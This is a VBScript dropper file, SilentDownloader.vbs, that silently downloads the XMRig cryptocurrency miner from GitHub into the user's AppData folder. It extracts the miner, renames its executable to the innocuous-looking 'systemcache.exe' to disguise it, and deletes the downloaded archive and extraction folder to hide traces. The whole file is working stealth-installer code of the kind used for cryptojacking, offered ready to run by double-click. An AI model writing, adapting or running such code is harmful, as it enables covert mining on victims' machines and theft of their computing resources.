' File: SilentDownloader.vbs (Run via double-click)
' Purpose: Silent download and setup of XMRig miner
' Requires: Internet access & valid GitHub release URL

Dim shell, fso, appData, minerDir, zipUrl, zipPath, extractDir, exeName, finalExePath
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Config
zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
exeName = "systemcache.exe"
appData = shell.ExpandEnvironmentStrings("%APPDATA%")
minerDir = appData & "\XMRigMiner"
zipPath = minerDir & "\xmrig.zip"
extractDir = minerDir & "\extract"
finalExePath = minerDir & "\xmrig-6.21.0\" & exeName

If Not fso.FolderExists(minerDir) Then fso.CreateFolder(minerDir)

' === DOWNLOAD
If Not fso.FileExists(zipPath) Then
    Dim http, stream
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", zipUrl, False
    http.Send

    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile zipPath, 2
        stream.Close
    End If
End If

' === EXTRACT
If fso.FileExists(zipPath) Then
    If Not fso.FolderExists(extractDir) Then fso.CreateFolder(extractDir)
    Dim shellApp : Set shellApp = CreateObject("Shell.Application")
    shellApp.NameSpace(extractDir).CopyHere shellApp.NameSpace(zipPath).Items

    ' Wait for extraction to complete
    Dim i
    For i = 0 To 10
        If fso.FileExists(extractDir & "\xmrig-6.21.0\xmrig.exe") Then Exit For
        WScript.Sleep 1000
    Next
End If

' === MOVE FOLDER TO FINAL
If fso.FolderExists(extractDir & "\xmrig-6.21.0") Then
    If fso.FolderExists(minerDir & "\xmrig-6.21.0") Then fso.DeleteFolder minerDir & "\xmrig-6.21.0", True
    fso.MoveFolder extractDir & "\xmrig-6.21.0", minerDir & "\xmrig-6.21.0"
End If

' === RENAME
Dim originalExe : originalExe = minerDir & "\xmrig-6.21.0\xmrig.exe"
If fso.FileExists(originalExe) Then
    If fso.FileExists(finalExePath) Then fso.DeleteFile finalExePath
    fso.MoveFile originalExe, finalExePath
End If

' === CLEANUP
If fso.FileExists(zipPath) Then fso.DeleteFile zipPath
If fso.FolderExists(extractDir) Then fso.DeleteFolder extractDir, True

' === DONE
' Runs silently, synchronously, and finishes clean
